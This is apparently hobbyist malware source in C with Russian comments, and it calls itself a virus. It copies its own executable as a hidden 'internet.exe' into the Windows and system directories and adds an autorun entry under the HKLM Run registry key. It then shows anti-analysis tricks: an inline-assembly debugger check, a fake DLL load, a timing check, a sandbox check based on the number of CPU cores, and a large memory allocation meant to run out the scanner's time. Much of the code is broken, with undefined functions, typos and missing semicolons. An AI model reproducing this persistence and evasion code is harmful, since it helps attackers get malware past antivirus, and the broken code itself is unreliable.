// Подключаем библиотеки и создаем основные переменные.

#include <windows.h>
#include <iostream.h>

WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
HKEY key;
char sysdir[256],
windir[256],
myname[256];

/*Узнаем свое имя функцией GetModuleFileName. И узнает адрес папки windows и папки system32 функциями GetWindowsDirectory и GetSystemDirectory*/

GetModuleFileName(hint,myname,256);
GetWindowsDirectory(windir,sizeof(windir));
GetSystemDirectory(sysdir,sizeof(sysdir));

/*Добавляем к строкам содержащим пути к системным папкам имя нашего вируса, чтобы скопировать в эти папки себя.*/

strcat(windir,"\\internet.exe");
strcat(sysdir,"\\internet.exe");

//Копируемся и ставим себе скрытые атрибуты

CopyFile(myname,windir,FALSE);
CopyFile(myname,sysdir,FALSE);
SetFileAttributes(windir,FILE_ATTRIBUTE_HIDDEN);
SetFileAttributes(sysdir,FILE_ATTRIBUTE_HIDDEN);

//Прописываемся в реестр на автозагрузку

RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &key);
RegSetValueEx(key,"internet.exe",0,REG_SZ,(BYTE *)sysdir,256);
RegCloseKey(key);
//_______________________________________________________________
// Ассемблерная вставка для C по детектированию отладчика
 ___asm
{
CheckDebugger:
   PUSH EAX                        //Save EAX value to stack
   MOV EAX, DWORD PTR FS:[0x18]    //Get PEB structure address
   MOV EAX, DWORD PTR [EAX+0x30]   //Get BeingDebuged byte
   CMP BYTE PTR [eax+2], 0         //Check if BeingDebug
   JNE CheckDebugger               //If debugger present check again...
   POP EAX                         //Put back the EAX value
}
// Загрузка поддерльной библиотеки на C
HISTANCE DLL = LoadLibrary(TEXT("fake.dll")); //
if (DLL != NULL){
  BypassAV(argv);
}
// Время на сканирование ограничено. Сей факт означает, что сканер не может тратить слишком C
// много времени на сканирование файлов, вначале разработчики использовали функцию sleep()
// с целью дождаться окончания, но сейчас этот трюк не работает.
// Мы будем использовалить API-функцию <<GetTickCount()>>
// Данная фукнкция извлекает кол-во миллисекунд, прошедших с момента запуска системы
// Мы будем использовать эту функцию для получения времени, прошедшее с момента запуска ОС.
int Tick = GetTickCount()
Sleep(1000);
int Tac = GetTickCount()
if((Tac - Tick) < 1000){
    BypassAV(argv, NameTrigger);  //Todo: научиться применять ассемблерные вставки, освоить код на C, выучить Windows API
}
// Проверка количества ядер | проверка на нахождение в песочнице C
SYSTEM_INFO SysGuide;
GetSystemInfo(&SysGuide);
int CoreNum = SysGuide.dwNumberofProcessors;
if (CoreNum < 2){
   return false; // возвращаем False - если мы в песочнице и действуем с этим False 
}
// Выделение большого объема памяти
// Этот метод эксплуатирует ограниченное время, используемое при сканировании C
// Мы выделяем около 100 Мб памяти и заполняем данное пространство пустыми байтами. Затем память осовобождается.
сhar * Memdmp = NULL;
Memdmp = (char *)malloc(100000000);
if (Memdmp != NULL){
     memset(Memdmp, 00, 100000000);
     free(Memdmp);
}
  
